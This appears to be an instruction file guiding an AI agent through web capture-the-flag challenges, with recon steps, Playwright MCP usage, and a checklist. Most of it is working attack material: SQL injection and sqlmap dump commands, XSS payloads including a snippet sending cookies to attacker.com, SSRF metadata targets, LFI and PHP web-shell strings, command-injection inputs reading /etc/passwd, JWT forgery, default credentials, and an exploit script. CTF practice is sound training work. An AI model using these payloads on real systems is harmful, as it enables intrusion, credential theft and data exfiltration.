# Web Exploitation Instructions

Follow these structured steps when tackling web application security challenges.

## Initial Setup

1. **Organize workspace**:
   ```bash
   mkdir -p ~/ctf/web/[challenge_name]
   cd ~/ctf/web/[challenge_name]
   touch notes.md
   ```

2. **Record challenge details**:
   - URL/endpoint
   - Credentials (if provided)
   - Source code (if provided)
   - Challenge description and hints

## Step 1: Reconnaissance

### Manual Inspection

```bash
# Fetch homepage
curl -i http://target.com

# Check common files
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml
curl http://target.com/.git/HEAD
curl http://target.com/.env
curl http://target.com/package.json
curl http://target.com/composer.json
```

### Browser DevTools
1. Open browser DevTools (F12)
2. **Elements**: Inspect HTML, hidden fields, comments
3. **Console**: Check for errors, debug output
4. **Network**: Monitor requests/responses, cookies, headers
5. **Storage**: Examine cookies, localStorage, sessionStorage
6. **Sources**: Review JavaScript files for:
   - API endpoints
   - Hardcoded secrets
   - Client-side validation
   - Debug code

### Automated Scanning

```bash
# Technology detection
whatweb http://target.com

# Directory enumeration
gobuster dir -u http://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,js,bak,old,zip

# Subdomain enumeration (if applicable)
gobuster dns -d target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Nikto scan (be careful, noisy)
nikto -h http://target.com -o nikto.txt
```

## Step 2: Playwright Browser Automation

Use Playwright MCP for dynamic testing:

```plaintext
# Navigate to application
#mcp playwright navigate to http://target.com

# Take screenshot for documentation
#mcp playwright screenshot as initial-page.png

# Interact with elements
#mcp playwright click on login button
#mcp playwright type into username field: admin
#mcp playwright type into password field: password

# Extract data
#mcp playwright snapshot to see page structure
```

## Step 3: Vulnerability Testing

### SQL Injection

**Test basic SQLi**:
```bash
# URL parameters
curl "http://target.com/page?id=1'"
curl "http://target.com/page?id=1 OR 1=1--"
curl "http://target.com/page?id=1' ORDER BY 1--"

# POST data
curl -X POST http://target.com/login \
  -d "username=admin'--&password=anything"

# Automated with sqlmap
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
```

**Manual SQLi exploitation**:
```sql
-- Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (until error)

-- Find injectable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

-- Extract data
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT username,password,NULL FROM users--
```

### Cross-Site Scripting (XSS)

**Test inputs**:
```html
<!-- Basic XSS -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Event handlers -->
" onload="alert(1)
" autofocus onfocus="alert(1)

<!-- JavaScript protocol -->
javascript:alert(1)

<!-- DOM XSS -->
#<img src=x onerror=alert(1)>
```

**Steal cookies**:
```html
<script>
fetch('http://attacker.com/?c='+document.cookie)
</script>
```

### Server-Side Request Forgery (SSRF)

```bash
# Test internal network
http://localhost
http://127.0.0.1
http://0.0.0.0
http://169.254.169.254/latest/meta-data/  # AWS metadata

# Test different protocols
file:///etc/passwd
gopher://localhost:6379/_  # Redis
```

### Local File Inclusion (LFI)

```bash
# Path traversal
?file=../../../etc/passwd
?page=....//....//....//etc/passwd

# PHP wrappers
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://input  # + POST data with PHP code
?file=data://text/plain,<?php system($_GET['cmd']); ?>

# Log poisoning
?file=/var/log/apache2/access.log  # after injecting PHP in User-Agent
```

### Command Injection

```bash
# Test separators
; ls -la
| whoami
& cat /etc/passwd
`id`
$(cat flag.txt)

# Encoded
%0als  # newline + ls
%26whoami  # & whoami

# Time-based detection
; sleep 10
| ping -c 10 127.0.0.1
```

### Authentication Bypass

```bash
# SQL injection in login
username: admin' OR '1'='1
password: anything

username: admin'--
password: (empty)

# JWT manipulation
# Decode JWT at jwt.io
# Try algorithm "none"
# Crack weak secrets: hashcat -m 16500 jwt.txt wordlist.txt

# Session fixation
# Set your session cookie before login

# Default credentials
admin:admin
admin:password
root:root
admin:Admin123
```

### Directory Traversal

```bash
# Reading files
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd  # Double encoding

# Null byte bypass
../../../etc/passwd%00
../../../etc/passwd%00.png
```

## Step 4: Source Code Review (if provided)

### Key Security Issues to Find

**Python/Flask/Django**:
```python
# Unsafe deserialization
import pickle
data = pickle.loads(user_input)  # VULNERABLE

# Template injection
return render_template_string(user_input)  # VULNERABLE

# SQL injection
cursor.execute("SELECT * FROM users WHERE id = " + user_id)  # VULNERABLE

# Command injection
os.system("ping " + user_input)  # VULNERABLE
```

**PHP**:
```php
# eval() is evil
eval($_GET['code']);  # VULNERABLE

# Unserialize
$obj = unserialize($_COOKIE['data']);  # VULNERABLE

# File inclusion
include($_GET['page'] . '.php');  # VULNERABLE
```

**JavaScript/Node.js**:
```javascript
// Prototype pollution
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];  // VULNERABLE
  }
}

// NoSQL injection
db.users.find({ username: req.body.username });  // VULNERABLE if object

// Command injection
exec(`ping ${req.query.host}`);  // VULNERABLE
```

## Step 5: Exploitation Script

Create `exploit.py`:

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urlencode

# Target
BASE_URL = 'http://target.com'
session = requests.Session()

# Example: SQLi exploitation
def sqli_dump():
    url = f'{BASE_URL}/page'
    
    # Determine columns
    for i in range(1, 10):
        params = {'id': f"1' ORDER BY {i}--"}
        r = session.get(url, params=params)
        if 'error' in r.text.lower():
            columns = i - 1
            break
    
    print(f"[+] Found {columns} columns")
    
    # Extract data
    payload = f"1' UNION SELECT {','.join(['NULL']*columns)}--"
    # ... continue exploitation

# Example: Authentication bypass
def login_bypass():
    url = f'{BASE_URL}/login'
    data = {
        'username': "admin'--",
        'password': 'anything'
    }
    r = session.post(url, data=data)
    print(r.text)

if __name__ == '__main__':
    # Run exploits
    sqli_dump()
```

## Step 6: Using Playwright MCP for Complex Scenarios

When you need browser automation:

```plaintext
# Login sequence
#mcp playwright navigate to http://target.com/login
#mcp playwright type into username: admin'--
#mcp playwright type into password: test
#mcp playwright click on Login button
#mcp playwright screenshot as after-login.png

# Extract dynamic content
#mcp playwright snapshot
# Parse the output for flags or data
```

## Common Web CTF Patterns

### Pattern 1: Hidden Flag in Source
- Check HTML comments: `<!-- flag{...} -->`
- Check JavaScript files
- Check CSS files
- View page source (not just inspect element)

### Pattern 2: Cookie Manipulation
```python
import jwt
import base64

# Decode
cookie = "eyJ0eXAi..."
decoded = jwt.decode(cookie, verify=False)

# Modify
decoded['admin'] = True

# Re-encode (if key known or none algorithm)
new_cookie = jwt.encode(decoded, 'secret', algorithm='HS256')
```

### Pattern 3: API Endpoint Enumeration
```bash
# Burp Suite: Send to Intruder
# Test: /api/v1/users/1 through /api/v1/users/100
# Test: /api/user, /api/admin, /api/flag
```

### Pattern 4: IDOR (Insecure Direct Object Reference)
```bash
# Change ID parameters
/user/profile?id=1  # Your profile
/user/profile?id=2  # Someone else's
/user/profile?id=0  # Admin?
```

## Checklist

- [ ] Performed reconnaissance (manual + automated)
- [ ] Identified web framework/technology
- [ ] Tested for common vulnerabilities (SQLi, XSS, etc.)
- [ ] Reviewed source code (if provided)
- [ ] Enumerated all endpoints and parameters
- [ ] Tested authentication mechanisms
- [ ] Checked for hidden functionality
- [ ] Automated exploitation with scripts
- [ ] Verified flag format and submission

## Tools Quick Reference

```bash
# Burp Suite Community
java -jar /opt/burpsuite_community.jar

# OWASP ZAP
/opt/zap/zap.sh

# Sqlmap
sqlmap -u URL --batch

# Playwright via Copilot MCP
#mcp playwright [command]
```
